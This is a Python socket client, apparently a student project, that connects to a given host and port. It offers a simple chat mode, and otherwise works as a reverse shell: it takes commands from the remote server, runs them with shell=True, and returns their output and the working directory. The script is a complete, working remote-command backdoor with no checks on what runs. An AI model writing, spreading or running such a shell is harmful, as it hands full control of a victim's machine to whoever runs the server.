import socket        # Importing libraries
import os
import subprocess
import datetime
import sys
import time
import argparse


parser = argparse.ArgumentParser()
# Port argument from user
parser.add_argument('--port', type=int, help='port to listen on')
# IP address argument from uuser
parser.add_argument('--ipaddr', type=str, help='ip address')
args = parser.parse_args()


socket_family = socket.getaddrinfo(args.ipaddr, args.port)[0][0]
if socket_family == socket.AF_INET6:
    print("Im inside IPV6..............")
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)  # Creating a socket
    s.connect((args.ipaddr, args.port))  # Connecting to the server
elif socket_family == socket.AF_INET:
    print("Im inside IPV4..............")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creating a socket
    s.connect((args.ipaddr, args.port))  # Connecting to the server

feature = input("Feature: ")
if feature=="chatbox":
    while(True):
        res = s.recv(1024).decode()     # Recieving message from the server
        inp = None
        if(res == 'wait'):
            res = s.recv(1024).decode()
            time.sleep(0.1)
            print(res)
            if("close" in res):
                s.close()
                sys.exit()

        elif(res=="send"):
            print("You: ", end='')    # Prompt user to type the message
            inp = input()
            # Sending user message from client to server
            s.sendall(inp.encode('utf-8'))

        if(inp == "close"):             # Closing the socket
            s.close()
            sys.exit()

else:
    while True:
        data = s.recv(1024)

        if data[:2].decode("utf-8") == 'cd':
            currentWD = ""
            try:
                os.chdir(data[3:].decode("utf-8"))                            # Printing the output the executed command to the client
                currentWD = "Current Directory : "+os.getcwd()+"> " # Current Directory
            except:
                currentWD = "No such file or directory"
            s.send(str.encode(currentWD))    # Sending the result to the user
            print(currentWD)
            continue
        if data.decode("utf-8") == 'close':
            print("Coonection closed with server")
            s.close()
            break
        if len(data) > 0 :               # Take the command given by the user execute it
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()  # Getting the output after executing the command
            output_str = str(output_byte,"utf-8")         # Result of the executed is stored in the string and sent back to the user
            currentWD = "Current Directory : "+os.getcwd()+"> " # Current Directory
            s.send(str.encode(output_str + currentWD))    # Sending the result to the user
            print(output_str)                             # Printing the output the executed command to the client
